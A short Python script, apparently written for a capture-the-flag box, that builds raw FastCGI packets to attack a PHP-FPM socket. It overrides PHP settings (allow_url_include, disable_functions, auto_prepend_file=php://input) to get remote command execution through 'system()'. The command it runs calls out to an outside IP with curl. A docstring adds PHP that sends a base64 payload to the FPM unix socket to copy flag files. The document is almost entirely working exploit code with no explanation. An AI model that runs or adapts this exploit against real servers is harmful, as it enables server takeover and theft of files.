import urllib
import base64

filename="/var/www/html/index.php"

command = 'curl 10.10.14.46'
length=len(command)+19
char=chr(length)

data = "\x0f\x10SERVER_SOFTWAREgo / fcgiclient \x0b\tREMOTE_ADDR127.0.0.1\x0f\x08SERVER_PROTOCOLHTTP/1.1\x0e" + chr(len(str(length)))
data += "CONTENT_LENGTH" + str(length) +  "\x0e\x04REQUEST_METHODPOST\tKPHP_VALUEallow_url_include = On\n"
data += "disable_functions = \nauto_prepend_file = php://input\x0f" + chr(len(filename)) +"SCRIPT_FILENAME" + filename + "\r\x01DOCUMENT_ROOT/"

temp1 = chr(len(data) / 256)
temp2 = chr(len(data) % 256)
temp3 = chr(len(data) % 8)

end = str("\x00"*(len(data)%8)) + "\x01\x04\x00\x01\x00\x00\x00\x00\x01\x05\x00\x01\x00" + char + "\x04\x00"
end += "<?php system('" + command + "');?>\x00\x00\x00\x00"

start = "\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x04\x00\x01" + temp1 + temp2 + temp3 + "\x00"

payload = start + data + end

f = open('out', 'wb')
f.write(payload)
f.close()


print(base64.b64encode(payload))

"""
<?php
$sock = stream_socket_client('unix:///run/php/php7.4-fpm.sock', $errno, $errst);fwrite($sock,base64_decode('AQEAAQAIAAAAAQAAAAAAAAEEAAEBBAQADxBTRVJWRVJfU09GVFdBUkVnbyAvIGZjZ2ljbGllbnQgCwlSRU1PVEVfQUREUjEyNy4wLjAuMQ8IU0VSVkVSX1BST1RPQ09MSFRUUC8xLjEOAkNPTlRFTlRfTEVOR1RINDEOBFJFUVVFU1RfTUVUSE9EUE9TVAlLUEhQX1ZBTFVFYWxsb3dfdXJsX2luY2x1ZGUgPSBPbgpkaXNhYmxlX2Z1bmN0aW9ucyA9IAphdXRvX3ByZXBlbmRfZmlsZSA9IHBocDovL2lucHV0DxdTQ1JJUFRfRklMRU5BTUUvdmFyL3d3dy9odG1sL2luZGV4LnBocA0BRE9DVU1FTlRfUk9PVC8AAAAAAQQAAQAAAAABBQABACkEADw/cGhwIHN5c3RlbSgnY3AgL2ZsYWcqIC90bXAvcjRqZmxhZycpOz8+AAAAAA=='));sleep(1);fclose($sock);
?>
"""

